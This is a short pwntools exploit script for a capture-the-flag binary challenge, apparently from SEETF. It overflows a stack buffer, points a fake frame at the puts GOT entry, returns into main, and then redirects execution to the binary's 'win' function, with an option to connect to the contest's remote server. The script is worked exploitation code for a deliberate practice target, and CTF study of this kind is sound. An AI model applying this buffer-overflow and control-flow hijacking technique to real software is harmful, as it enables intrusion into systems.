from pwn import *


binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x401231
break *0x40123d
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('fun.chall.seetf.sg',50003)
    else:
        return process(e.path)

p = start()

def pass_check():
   pad = cyclic(32)
   chain = p64(e.got['puts']+0x20) 
   chain += p64(e.sym['main']+0x46)

   p.recvuntil(b'I will let you  overflow me.')
   p.sendline(pad+chain)

def jmp_to_win():
   win = p64(e.sym['win'])

   p.recvuntil(b'I will give you one more chance.')
   p.sendline(win)

pass_check()
jmp_to_win()
p.interactive()
